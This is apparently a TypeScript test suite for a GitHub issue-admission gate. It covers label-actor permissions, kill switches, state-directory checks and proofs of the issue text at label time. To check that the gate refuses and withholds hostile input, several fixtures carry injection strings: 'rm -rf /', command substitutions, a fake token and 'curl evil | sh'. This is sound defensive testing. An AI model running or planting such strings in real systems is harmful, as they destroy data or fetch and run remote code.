import assert from "node:assert/strict";
import {
	chmodSync,
	mkdirSync,
	mkdtempSync,
	readdirSync,
	readFileSync,
	rmSync,
	statSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, describe, it } from "node:test";
import { EXIT, runCli } from "../server/cli.ts";
import {
	type AdmissionReceipt,
	admitTicket,
	FACTORY_REPOSITORIES,
	fileAdmissionStore,
	labelTimeSnapshot,
	snapshotDigest,
} from "../src/admission.ts";
import type { BodyHistory } from "../src/adapters/github.ts";
import { digestOf } from "../src/run.ts";
import type { JsonValue } from "../src/tickets.ts";
import { isRepoSlug, type RepoSlug } from "../src/workflow.ts";
import {
	FAKE_REPO,
	FakeGitHub,
	type FakeIssue,
	fakeIssue,
	httpError,
	labelEvent,
	MAIN_SHA,
	networkError,
	renamedEvent,
	TRUSTED_WORKFLOW,
} from "./fake-ticket-adapter.ts";

function slug(text: string): RepoSlug {
	if (!isRepoSlug(text)) throw new Error(`bad slug ${text}`);

	return text;
}

const repo = slug(FAKE_REPO);
const LABEL_AT = "2026-10-29T01:21:37Z";
const dirs: string[] = [];

function stateDir(): string {
	const dir = mkdtempSync(join(tmpdir(), "factory-admit-"));

	dirs.push(dir);

	return dir;
}

afterEach(() => {
	for (const dir of dirs.splice(0))
		rmSync(dir, { recursive: true, force: true });
});

function labeledBy(actor: string, change: Partial<FakeIssue> = {}): FakeIssue {
	return fakeIssue(14, {
		timeline: [labelEvent({ id: 34537521383, at: LABEL_AT, actor })],
		...change,
	});
}

async function admit(
	github: FakeGitHub,
	state = stateDir(),
	paging = { pageSize: 100, maxPages: 10 },
): Promise<AdmissionReceipt> {
	return admitTicket({
		exec: github.exec,
		env: () => "/home/exedev",
		repo,
		issue: 14,
		allowlist: FACTORY_REPOSITORIES,
		store: fileAdmissionStore(state),
		paging,
	});
}

function reasonKinds(receipt: AdmissionReceipt): string[] {
	return receipt.reasons.map((reason) => reason.kind);
}

const unedited = (title: string, body: string) =>
	snapshotDigest({ title, body });

describe("admitTicket", () => {
	it("admits a write-access label event with a receipt and starts nothing else", async () => {
		const github = new FakeGitHub();
		const state = stateDir();

		github.add(labeledBy("giuseppecrj"));

		const receipt = await admit(github, state);

		assert.deepEqual(receipt, {
			decision: "admitted",
			repo,
			issue: 14,
			issueUrl: `https://github.com/${FAKE_REPO}/issues/14`,
			reasons: [],
			eventId: "34537521383",
			eventAt: LABEL_AT,
			actor: "giuseppecrj",
			actorPermission: "admin",
			snapshotDigest: unedited("Fixture 14", "Body of fixture 14."),
			snapshotSource: "unedited",
			baseSha: MAIN_SHA,
			workflowDigest: digestOf(TRUSTED_WORKFLOW),
		});

		const record = join(
			state,
			"admissions/github/giuseppecrj/pi-herdr-factorio/14/34537521383.json",
		);

		assert.equal(statSync(record).mode & 0o777, 0o600);

		assert.deepEqual(JSON.parse(readFileSync(record, "utf8")).snapshot, {
			title: "Fixture 14",
			body: "Body of fixture 14.",
		});

		for (const call of github.calls) {
			assert.equal(call[0], "gh");
			assert.ok(!call.includes("--paginate"));
		}
	});

	it("decides on the label actor, not the issue author", async () => {
		const byWriter = new FakeGitHub();

		byWriter.add(
			labeledBy("writer", { author: "exe-dev-github-integration[bot]" }),
		);

		assert.equal((await admit(byWriter)).decision, "admitted");

		const byBot = new FakeGitHub();

		byBot.add(
			labeledBy("exe-dev-github-integration[bot]", { author: "giuseppecrj" }),
		);

		const refused = await admit(byBot);

		assert.deepEqual(refused.reasons, [
			{ kind: "unauthorized", permission: "none" },
		]);
		assert.equal(refused.actor, "exe-dev-github-integration[bot]");
		assert.equal(refused.snapshotDigest, null);
	});

	it("follows the latest ready label event, not an earlier writer's", async () => {
		const github = new FakeGitHub();

		github.add(
			fakeIssue(14, {
				timeline: [
					labelEvent({
						id: 1,
						at: "2026-10-29T01:00:00Z",
						actor: "giuseppecrj",
					}),
					labelEvent({
						id: 2,
						at: "2026-10-29T01:00:05Z",
						actor: "giuseppecrj",
						event: "unlabeled",
					}),
					labelEvent({ id: 3, at: "2026-10-29T01:00:10Z", actor: "triager" }),
				],
			}),
		);

		const receipt = await admit(github);

		assert.equal(receipt.eventId, "3");
		assert.deepEqual(receipt.reasons, [
			{ kind: "unauthorized", permission: "read" },
		]);
	});

	it("chooses the ready event by time, not by array position", async () => {
		const newestFirst = new FakeGitHub();

		newestFirst.add(
			fakeIssue(14, {
				timeline: [
					labelEvent({ id: 3, at: "2026-10-29T01:00:10Z", actor: "triager" }),
					labelEvent({
						id: 2,
						at: "2026-10-29T01:00:05Z",
						actor: "giuseppecrj",
						event: "unlabeled",
					}),
					labelEvent({
						id: 1,
						at: "2026-10-29T01:00:00Z",
						actor: "giuseppecrj",
					}),
				],
			}),
		);

		const receipt = await admit(newestFirst);

		assert.equal(receipt.eventId, "3");
		assert.deepEqual(receipt.reasons, [
			{ kind: "unauthorized", permission: "read" },
		]);

		const removed = new FakeGitHub();

		removed.add(
			fakeIssue(14, {
				timeline: [
					labelEvent({
						id: 2,
						at: "2026-10-29T01:30:00Z",
						actor: "writer",
						event: "unlabeled",
					}),
					labelEvent({ id: 1, at: LABEL_AT, actor: "writer" }),
				],
			}),
		);

		assert.deepEqual(reasonKinds(await admit(removed)), ["not_labeled"]);
	});

	it("refuses ready events that share the latest second", async () => {
		const pairs: [JsonValue, JsonValue][] = [
			[
				labelEvent({ id: 1, at: LABEL_AT, actor: "triager" }),
				labelEvent({ id: 2, at: LABEL_AT, actor: "giuseppecrj" }),
			],
			[
				labelEvent({
					id: 1,
					at: LABEL_AT,
					actor: "writer",
					event: "unlabeled",
				}),
				labelEvent({ id: 2, at: LABEL_AT, actor: "writer" }),
			],
		];

		for (const pair of pairs) {
			const github = new FakeGitHub();

			github.add(
				fakeIssue(14, {
					timeline: [
						labelEvent({ id: 9, at: "2026-10-29T01:00:00Z", actor: "writer" }),
						...pair,
					],
				}),
			);

			const receipt = await admit(github);

			assert.deepEqual(receipt.reasons, [
				{ kind: "ambiguous_snapshot", detail: "label_events_same_second" },
			]);
			assert.equal(receipt.eventId, null);
		}
	});

	it("refuses a denied or unreadable permission and a withheld actor", async () => {
		const failing = new FakeGitHub();

		failing.add(labeledBy("writer"));
		failing.failures.set(`repos/${FAKE_REPO}/collaborators/`, httpError(403));

		assert.deepEqual((await admit(failing)).reasons, [
			{
				kind: "permission_unavailable",
				failure: { kind: "gh_failed", cause: "auth", status: 403 },
			},
		]);

		const unknown = new FakeGitHub();

		unknown.add(labeledBy("not-a-collaborator"));
		assert.deepEqual(reasonKinds(await admit(unknown)), [
			"permission_unavailable",
		]);

		const hostile = new FakeGitHub();

		hostile.add(labeledBy("evil; rm -rf /"));

		const withheld = await admit(hostile);

		assert.deepEqual(reasonKinds(withheld), ["actor_withheld"]);
		assert.equal(withheld.actor, "(withheld)");
		assert.ok(
			!hostile.calls.some((call) => call.join(" ").includes("collaborators")),
		);
	});

	it("records each label event once and admits a new label event again", async () => {
		const github = new FakeGitHub();
		const state = stateDir();

		github.add(labeledBy("writer"));

		const first = await admit(github, state);
		const second = await admit(github, state);

		assert.equal(first.decision, "admitted");
		assert.deepEqual(reasonKinds(second), ["duplicate_event"]);
		assert.equal(second.eventId, first.eventId);
		assert.equal(second.snapshotDigest, first.snapshotDigest);

		const issue = github.issues.get(14);

		issue?.timeline.push(
			labelEvent({
				id: 9,
				at: "2026-10-29T02:00:00Z",
				actor: "writer",
				event: "unlabeled",
			}),
			labelEvent({ id: 10, at: "2026-10-29T02:00:05Z", actor: "writer" }),
		);

		const relabeled = await admit(github, state);

		assert.equal(relabeled.decision, "admitted");
		assert.equal(relabeled.eventId, "10");
	});

	it("finds the label event across pages exactly once", async () => {
		const github = new FakeGitHub();

		const noise = Array.from({ length: 5 }, (_, i) =>
			labelEvent({
				id: 100 + i,
				at: `2026-10-29T01:00:0${i}Z`,
				actor: "writer",
				label: "documentation",
			}),
		);

		github.add(
			fakeIssue(14, {
				timeline: [
					...noise,
					labelEvent({ id: 7, at: LABEL_AT, actor: "writer" }),
				],
			}),
		);

		const receipt = await admit(github, stateDir(), {
			pageSize: 2,
			maxPages: 5,
		});

		assert.equal(receipt.decision, "admitted");
		assert.equal(receipt.eventId, "7");

		const limited = await admit(github, stateDir(), {
			pageSize: 2,
			maxPages: 2,
		});

		assert.deepEqual(limited.reasons, [
			{ kind: "timeline_unavailable", failure: { kind: "pagination_limit" } },
		]);
	});

	it("refuses closed issues, pull requests and missing or removed labels", async () => {
		const cases: [Partial<FakeIssue>, string][] = [
			[{ state: "closed" }, "issue_closed"],
			[{ pullRequest: true }, "pull_request"],
			[{ labels: [] }, "not_labeled"],
			[{ timeline: [] }, "no_label_event"],
			[
				{
					timeline: [
						labelEvent({ id: 1, at: LABEL_AT, actor: "writer" }),
						labelEvent({
							id: 2,
							at: "2026-10-29T01:30:00Z",
							actor: "writer",
							event: "unlabeled",
						}),
					],
				},
				"not_labeled",
			],
		];

		for (const [change, kind] of cases) {
			const github = new FakeGitHub();

			github.add(labeledBy("writer", change));
			assert.deepEqual(reasonKinds(await admit(github)), [kind], kind);
		}

		const missing = new FakeGitHub();

		assert.deepEqual((await admit(missing)).reasons, [
			{
				kind: "issue_unavailable",
				failure: { kind: "gh_failed", cause: "not_found", status: 404 },
			},
		]);
	});

	it("refuses without a valid trusted workflow on main", async () => {
		const github = new FakeGitHub();

		github.add(labeledBy("writer"));
		github.workflow = null;

		const receipt = await admit(github);

		assert.deepEqual(receipt.reasons, [
			{ kind: "workflow_unavailable", error: "missing_workflow_file" },
		]);
		assert.equal(receipt.baseSha, null);
	});
});

describe("admission kill switches", () => {
	it("refuses with the local flag file before any gh call", async () => {
		const github = new FakeGitHub();
		const state = stateDir();

		github.add(labeledBy("writer"));
		writeFileSync(join(state, "disabled"), "");

		assert.deepEqual(reasonKinds(await admit(github, state)), [
			"locally_disabled",
		]);
		assert.deepEqual(github.calls, []);
	});

	it("treats any disabled entry, even a dangling symlink, as locally disabled", async () => {
		const entries: [string, (path: string) => void][] = [
			[
				"dangling symlink",
				(path) => symlinkSync(join(path, "..", "gone"), path),
			],
			["directory", (path) => mkdirSync(path)],
		];

		for (const [name, create] of entries) {
			const github = new FakeGitHub();
			const state = stateDir();

			github.add(labeledBy("writer"));
			create(join(state, "disabled"));

			assert.deepEqual(
				reasonKinds(await admit(github, state)),
				["locally_disabled"],
				name,
			);
			assert.deepEqual(github.calls, [], name);
		}
	});

	it("refuses a symlinked, shared or foreign state directory before any gh call", async () => {
		const target = stateDir();
		const link = join(stateDir(), "state-link");

		symlinkSync(target, link);

		const groupWritable = stateDir();
		const worldWritable = stateDir();

		chmodSync(groupWritable, 0o770);
		chmodSync(worldWritable, 0o707);

		for (const state of [link, `${link}/`, groupWritable, worldWritable]) {
			const github = new FakeGitHub();

			github.add(labeledBy("writer"));

			assert.deepEqual(
				reasonKinds(await admit(github, state)),
				["state_unavailable"],
				state,
			);
			assert.deepEqual(github.calls, [], state);
		}

		const github = new FakeGitHub();
		const geteuid = process.geteuid;

		github.add(labeledBy("writer"));
		process.geteuid = () => (geteuid?.() ?? 0) + 1;

		try {
			assert.deepEqual(reasonKinds(await admit(github)), ["state_unavailable"]);
		} finally {
			process.geteuid = geteuid;
		}

		assert.deepEqual(github.calls, []);
	});

	it("refuses a missing state directory before any gh call", async () => {
		const github = new FakeGitHub();
		const state = join(stateDir(), "absent");

		github.add(labeledBy("writer"));

		assert.deepEqual(reasonKinds(await admit(github, state)), [
			"state_unavailable",
		]);
		assert.deepEqual(github.calls, []);
	});

	it("refuses a repository outside the allowlist before any gh call", async () => {
		const github = new FakeGitHub();

		const receipt = await admitTicket({
			exec: github.exec,
			env: () => undefined,
			repo: slug("someone/else"),
			issue: 1,
			allowlist: FACTORY_REPOSITORIES,
			store: fileAdmissionStore(stateDir()),
		});

		assert.deepEqual(reasonKinds(receipt), ["repo_not_allowed"]);
		assert.deepEqual(github.calls, []);
	});

	it("refuses when the switch label is absent, differs in case or is unreadable, and records nothing", async () => {
		const cases: [(github: FakeGitHub) => void, object][] = [
			[(github) => (github.repoLabels = []), { kind: "repo_switch_off" }],
			[
				(github) => (github.repoLabels = ["FACTORY:ENABLED"]),
				{ kind: "repo_switch_off" },
			],
			[
				(github) =>
					github.failures.set(
						`repos/${FAKE_REPO}/labels`,
						httpError(403, "Resource not accessible by integration"),
					),
				{
					kind: "repo_switch_unavailable",
					failure: { kind: "gh_failed", cause: "auth", status: 403 },
				},
			],
			[
				(github) =>
					github.failures.set(`repos/${FAKE_REPO}/labels`, networkError()),
				{
					kind: "repo_switch_unavailable",
					failure: { kind: "gh_failed", cause: "network", status: null },
				},
			],
		];

		for (const [arrange, reason] of cases) {
			const github = new FakeGitHub();
			const state = stateDir();

			github.add(labeledBy("writer"));
			arrange(github);

			const receipt = await admit(github, state);

			assert.equal(receipt.decision, "refused");
			assert.deepEqual(receipt.reasons, [reason]);
			assert.equal(receipt.eventId, "34537521383");
			assert.equal(
				receipt.snapshotDigest,
				unedited("Fixture 14", "Body of fixture 14."),
			);

			github.repoLabels = ["factory:enabled"];
			github.failures.clear();

			assert.equal((await admit(github, state)).decision, "admitted");
		}
	});

	it("lists a switch refusal together with the issue's own refusal", async () => {
		const github = new FakeGitHub();

		github.add(labeledBy("triager"));
		github.repoLabels = [];

		assert.deepEqual(reasonKinds(await admit(github)), [
			"repo_switch_off",
			"unauthorized",
		]);
	});
});

describe("admission records", () => {
	const issueDir = (state: string) =>
		join(state, "admissions/github/giuseppecrj/pi-herdr-factorio/14");

	it("refuses a file where a record directory belongs as unwritable, not duplicate", async () => {
		const cases: [string, (state: string) => void][] = [
			[
				"issue directory",
				(state) => {
					mkdirSync(join(issueDir(state), ".."), { recursive: true });
					writeFileSync(issueDir(state), "");
				},
			],
			[
				"admissions directory",
				(state) => writeFileSync(join(state, "admissions"), ""),
			],
		];

		for (const [name, arrange] of cases) {
			const github = new FakeGitHub();
			const state = stateDir();

			github.add(labeledBy("writer"));
			arrange(state);

			assert.deepEqual(
				reasonKinds(await admit(github, state)),
				["state_unwritable"],
				name,
			);
		}
	});

	it("records past a stale partial temp file and leaves no temp file of its own", async () => {
		const github = new FakeGitHub();
		const state = stateDir();
		const stale = ".34537521383.0123456789abcdef.tmp";

		github.add(labeledBy("writer"));
		mkdirSync(issueDir(state), { recursive: true, mode: 0o700 });
		writeFileSync(join(issueDir(state), stale), '{"receipt": {"dec');

		assert.equal((await admit(github, state)).decision, "admitted");

		const record = join(issueDir(state), "34537521383.json");

		assert.equal(statSync(record).mode & 0o777, 0o600);
		assert.equal(statSync(record).nlink, 1);
		assert.equal(
			JSON.parse(readFileSync(record, "utf8")).receipt.eventId,
			"34537521383",
		);
		assert.deepEqual(
			readdirSync(issueDir(state)).sort(),
			[stale, "34537521383.json"].sort(),
		);

		assert.deepEqual(reasonKinds(await admit(github, state)), [
			"duplicate_event",
		]);
		assert.deepEqual(
			readdirSync(issueDir(state)).sort(),
			[stale, "34537521383.json"].sort(),
		);
	});

	it("leaves nothing behind when the record directory is not writable", async () => {
		const github = new FakeGitHub();
		const state = stateDir();

		github.add(labeledBy("writer"));
		mkdirSync(issueDir(state), { recursive: true, mode: 0o700 });
		chmodSync(issueDir(state), 0o500);

		try {
			assert.deepEqual(reasonKinds(await admit(github, state)), [
				"state_unwritable",
			]);
			assert.deepEqual(readdirSync(issueDir(state)), []);
		} finally {
			chmodSync(issueDir(state), 0o700);
		}
	});
});

describe("label-time snapshot", () => {
	const versions = (...pairs: [string, string | null, boolean?][]) =>
		pairs.map(([editedAt, text, deleted]) => ({
			editedAt,
			text,
			deleted: deleted ?? false,
		}));

	function history(change: Partial<BodyHistory>): BodyHistory {
		const base: BodyHistory = {
			title: "T",
			body: "v3",
			lastEditedAt: "2026-10-29T01:21:47Z",
			includesCreatedEdit: true,
			totalVersions: 3,
			versions: versions(
				["2026-10-29T01:21:47Z", "v3"],
				["2026-10-29T01:21:44Z", "v2"],
				["2026-10-29T01:21:21Z", "v1"],
			),
			totalRenames: 0,
			renamedAt: [],
		};

		return { ...base, ...change };
	}

	const bind = (
		h: BodyHistory,
		labelAt = "2026-10-29T01:21:38Z",
		renamed = false,
		issueTitle = "T",
	) =>
		labelTimeSnapshot({
			history: h,
			labelAt,
			renamedSinceLabel: renamed,
			issueTitle,
		});

	const editedBeforeLabel = history({
		body: "v2",
		lastEditedAt: "2026-10-29T01:21:31Z",
		totalVersions: 2,
		versions: versions(
			["2026-10-29T01:21:31Z", "v2"],
			["2026-10-29T01:21:21Z", "v1"],
		),
	});

	const neverEdited = history({
		lastEditedAt: null,
		includesCreatedEdit: false,
		totalVersions: 0,
		versions: [],
	});

	it("uses the current body when its history ends before the label", () => {
		assert.deepEqual(bind(editedBeforeLabel), {
			kind: "proved",
			source: "unedited",
			snapshot: { title: "T", body: "v2" },
		});
		assert.deepEqual(bind(neverEdited), {
			kind: "proved",
			source: "unedited",
			snapshot: { title: "T", body: "v3" },
		});
		assert.equal(
			bind(
				history({
					lastEditedAt: null,
					totalVersions: 1,
					versions: versions(["2026-10-29T01:21:21Z", "v3"]),
				}),
			).kind,
			"proved",
		);
	});

	it("refuses the unedited shortcut when its history contradicts it", () => {
		const cases: [BodyHistory, string][] = [
			[
				history({ lastEditedAt: "2026-10-29T01:21:31Z" }),
				"history_contradicts_last_edit",
			],
			[
				history({
					lastEditedAt: "2026-10-29T01:21:31Z",
					totalVersions: 2,
					versions: versions(
						["2026-10-29T01:21:31Z", "v3"],
						["2026-10-29T01:21:35Z", "v1"],
					),
				}),
				"history_contradicts_last_edit",
			],
			[
				history({
					lastEditedAt: "2026-10-29T01:21:31Z",
					totalVersions: 2,
					versions: versions(
						["2026-10-29T01:21:38Z", "v3"],
						["2026-10-29T01:21:21Z", "v1"],
					),
				}),
				"edited_at_label_time",
			],
			[history({ lastEditedAt: null }), "history_contradicts_last_edit"],
			[
				history({
					lastEditedAt: null,
					includesCreatedEdit: false,
					totalVersions: 1,
					versions: versions(["2026-10-29T01:21:21Z", "v3"]),
				}),
				"history_contradicts_last_edit",
			],
			[
				history({
					lastEditedAt: null,
					totalVersions: 2,
					versions: versions(["2026-10-29T01:21:21Z", "v3"]),
				}),
				"history_contradicts_last_edit",
			],
			[
				history({
					lastEditedAt: null,
					totalVersions: 1,
					versions: versions(["2026-10-29T01:21:40Z", "v3"]),
				}),
				"history_contradicts_last_edit",
			],
		];

		for (const [h, detail] of cases) {
			assert.deepEqual(bind(h), { kind: "ambiguous", detail }, detail);
		}
	});

	it("refuses a never-edited issue that reports body versions through the adapter", async () => {
		const github = new FakeGitHub();

		github.add(
			labeledBy("writer", {
				lastEditedAt: null,
				includesCreatedEdit: true,
				versions: [
					{ editedAt: "2026-10-29T01:30:00Z", deletedAt: null, diff: "new" },
					{ editedAt: "2026-10-29T01:00:00Z", deletedAt: null, diff: "old" },
				],
			}),
		);

		assert.deepEqual((await admit(github)).reasons, [
			{ kind: "ambiguous_snapshot", detail: "history_contradicts_last_edit" },
		]);
	});

	it("proves the label-time body from history when edited after the label", () => {
		assert.deepEqual(bind(history({})), {
			kind: "proved",
			source: "edit_history",
			snapshot: { title: "T", body: "v1" },
		});

		assert.deepEqual(bind(history({}), "2026-10-29T01:21:45Z"), {
			kind: "proved",
			source: "edit_history",
			snapshot: { title: "T", body: "v2" },
		});
	});

	it("never substitutes the poll-time body", () => {
		const proof = bind(history({}));

		assert.ok(proof.kind === "proved" && proof.snapshot.body !== "v3");
	});

	it("refuses every case the history cannot prove", () => {
		const cases: [BodyHistory, string, boolean, string][] = [
			[history({}), "2026-10-29T01:21:38Z", true, "renamed_since_label"],
			[history({}), "2026-10-29T01:21:44Z", false, "edited_at_label_time"],
			[
				history({ lastEditedAt: "2026-10-29T01:21:38Z" }),
				"2026-10-29T01:21:38Z",
				false,
				"history_disagrees_with_body",
			],
			[
				history({ totalVersions: 101 }),
				"2026-10-29T01:21:38Z",
				false,
				"history_incomplete",
			],
			[
				history({ includesCreatedEdit: false }),
				"2026-10-29T01:21:38Z",
				false,
				"history_without_original",
			],
			[
				history({ body: "v4" }),
				"2026-10-29T01:21:38Z",
				false,
				"history_disagrees_with_body",
			],
			[history({}), "2026-10-29T01:21:20Z", false, "no_version_before_label"],
			[
				history({
					versions: versions(
						["2026-10-29T01:21:47Z", "v3"],
						["2026-10-29T01:21:44Z", "v2"],
						["2026-10-29T01:21:21Z", null, true],
					),
				}),
				"2026-10-29T01:21:38Z",
				false,
				"version_withheld",
			],
			[
				history({
					totalVersions: 4,
					versions: versions(
						["2026-10-29T01:21:47Z", "v3"],
						["2026-10-29T01:21:44Z", "v2"],
						["2026-10-29T01:21:21Z", "v1"],
						["2026-10-29T01:21:21Z", "v0"],
					),
				}),
				"2026-10-29T01:21:38Z",
				false,
				"version_withheld",
			],
		];

		for (const [h, labelAt, renamed, detail] of cases) {
			assert.deepEqual(
				bind(h, labelAt, renamed),
				{ kind: "ambiguous", detail },
				detail,
			);
		}
	});

	it("takes title evidence from the snapshot read", () => {
		const cases: [BodyHistory, string, string][] = [
			[
				history({ totalRenames: 1, renamedAt: ["2026-10-29T01:21:38Z"] }),
				"T",
				"renamed_since_label",
			],
			[
				history({ totalRenames: 1, renamedAt: ["2026-10-29T01:30:00Z"] }),
				"T",
				"renamed_since_label",
			],
			[
				history({ totalRenames: 2, renamedAt: ["2026-10-29T01:00:00Z"] }),
				"T",
				"rename_history_incomplete",
			],
			[history({}), "Old title", "title_changed_between_reads"],
		];

		for (const [h, issueTitle, detail] of cases) {
			assert.deepEqual(
				bind(h, "2026-10-29T01:21:38Z", false, issueTitle),
				{ kind: "ambiguous", detail },
				detail,
			);
		}

		assert.equal(
			bind(history({ totalRenames: 1, renamedAt: ["2026-10-29T01:00:00Z"] }))
				.kind,
			"proved",
		);
	});

	it("refuses a rename between the timeline read and the snapshot read", async () => {
		const renamed = (issue: FakeIssue, at: string) => {
			issue.renames.push({
				createdAt: at,
				previousTitle: issue.title,
				currentTitle: "Renamed",
			});
			issue.title = "Renamed";
		};

		const cases: [(issue: FakeIssue) => void, string][] = [
			[
				(issue) => renamed(issue, "2026-10-29T01:30:00Z"),
				"renamed_since_label",
			],
			[(issue) => renamed(issue, LABEL_AT), "renamed_since_label"],
			[
				(issue) => {
					issue.title = "Renamed";
				},
				"title_changed_between_reads",
			],
			[
				(issue) => {
					issue.totalRenames = 101;
				},
				"rename_history_incomplete",
			],
		];

		for (const [change, detail] of cases) {
			const github = new FakeGitHub();

			github.add(labeledBy("writer"));
			github.beforeGraphql = change;

			assert.deepEqual(
				(await admit(github)).reasons,
				[{ kind: "ambiguous_snapshot", detail }],
				detail,
			);
		}

		const before = new FakeGitHub();

		before.add(
			labeledBy("writer", {
				renames: [
					{
						createdAt: "2026-10-29T01:00:00Z",
						previousTitle: "Old",
						currentTitle: "Fixture 14",
					},
				],
			}),
		);

		assert.equal((await admit(before)).decision, "admitted");
	});

	it("binds an issue edited after its label through the adapter", async () => {
		const github = new FakeGitHub();

		github.add(
			labeledBy("writer", {
				body: "v2",
				lastEditedAt: "2026-10-29T01:21:47Z",
				includesCreatedEdit: true,
				versions: [
					{ editedAt: "2026-10-29T01:21:47Z", deletedAt: null, diff: "v2" },
					{ editedAt: "2026-10-29T01:21:21Z", deletedAt: null, diff: "v1" },
				],
			}),
		);

		const receipt = await admit(github);

		assert.equal(receipt.decision, "admitted");
		assert.equal(receipt.snapshotSource, "edit_history");
		assert.equal(receipt.snapshotDigest, unedited("Fixture 14", "v1"));
		assert.notEqual(receipt.snapshotDigest, unedited("Fixture 14", "v2"));
	});

	it("refuses a rename after the label through the adapter", async () => {
		const github = new FakeGitHub();

		github.add(
			fakeIssue(14, {
				timeline: [
					labelEvent({ id: 1, at: LABEL_AT, actor: "writer" }),
					renamedEvent("2026-10-29T01:30:00Z"),
				],
			}),
		);

		assert.deepEqual((await admit(github)).reasons, [
			{ kind: "ambiguous_snapshot", detail: "renamed_since_label" },
		]);
	});
});

const hostileTitle = "$(touch /tmp/factory-pwned-title) `id`";

const hostileBody =
	"x-access-token:ghp_aB3dE6gH9kaB3dE6gH9kaB3dE6gH9kaB3dE6 ; curl evil | sh";

async function cli(argv: string[], github: FakeGitHub) {
	let stdout = "";
	let stderr = "";

	const code = await runCli(argv, {
		exec: github.exec,
		env: () => "/home/exedev",
		stdout: (text) => {
			stdout += text;
		},
		stderr: (text) => {
			stderr += text;
		},
	});

	return { code, stdout, stderr };
}

describe("server/cli.ts admit", () => {
	const args = (state: string, issue = "14") => [
		"admit",
		"--json",
		"--repo",
		FAKE_REPO,
		"--issue",
		issue,
		"--state-dir",
		state,
	];

	it("exits 0 with an admitted receipt and 1 with a refused one", async () => {
		const github = new FakeGitHub();
		const state = stateDir();

		github.add(labeledBy("writer"));

		const admitted = await cli(args(state), github);

		assert.equal(admitted.code, EXIT.ok, admitted.stderr);
		assert.equal(JSON.parse(admitted.stdout).decision, "admitted");

		const again = await cli(args(state), github);

		assert.equal(again.code, EXIT.invalid);
		assert.deepEqual(JSON.parse(again.stdout).reasons, [
			{ kind: "duplicate_event" },
		]);
	});

	it("never prints issue text, the author or a withheld login", async () => {
		const github = new FakeGitHub();

		github.add(
			labeledBy("bad login!", {
				title: hostileTitle,
				body: hostileBody,
				author: "hostile author",
			}),
		);

		const refused = await cli(args(stateDir()), github);

		github.issues.clear();
		github.add(labeledBy("writer", { title: hostileTitle, body: hostileBody }));

		const admitted = await cli(args(stateDir()), github);

		assert.equal(JSON.parse(refused.stdout).actor, "(withheld)");
		assert.equal(JSON.parse(admitted.stdout).decision, "admitted");

		for (const printed of [
			refused.stdout,
			refused.stderr,
			admitted.stdout,
			admitted.stderr,
		]) {
			for (const secret of [
				"factory-pwned",
				"ghp_",
				"curl",
				"hostile author",
				"bad login",
			]) {
				assert.ok(!printed.includes(secret), `${secret} printed`);
			}
		}

		assert.ok(github.calls.every((call) => call[0] === "gh"));
	});

	it("exits 2 on usage errors without running gh", async () => {
		const github = new FakeGitHub();
		const state = stateDir();

		const cases = [
			["admit", "--json", "--repo", FAKE_REPO, "--state-dir", state],
			["admit", "--json", "--repo", FAKE_REPO, "--issue", "14"],
			[
				"admit",
				"--json",
				"--repo",
				FAKE_REPO,
				"--issue",
				"14",
				"--state-dir",
				"",
			],
			args(state, "0"),
			args(state, "-1"),
			args(state, "14; id"),
			args(state, "1e3"),
			["admit", "--repo", FAKE_REPO, "--issue", "14", "--state-dir", state],
			[...args(state), "--ref", "main"],
			[
				"admit",
				"--json",
				"--repo",
				"../x",
				"--issue",
				"14",
				"--state-dir",
				state,
			],
			["status", "--json", "--repo", FAKE_REPO, "--issue", "14"],
			["workflow-check", "--json", "--repo", FAKE_REPO, "--state-dir", state],
		];

		for (const argv of cases) {
			const run = await cli(argv, github);

			assert.equal(run.code, EXIT.usage, argv.join(" "));
			assert.equal(run.stdout, "");
			assert.match(run.stderr, /Usage:/);
		}

		assert.deepEqual(github.calls, []);
	});
});
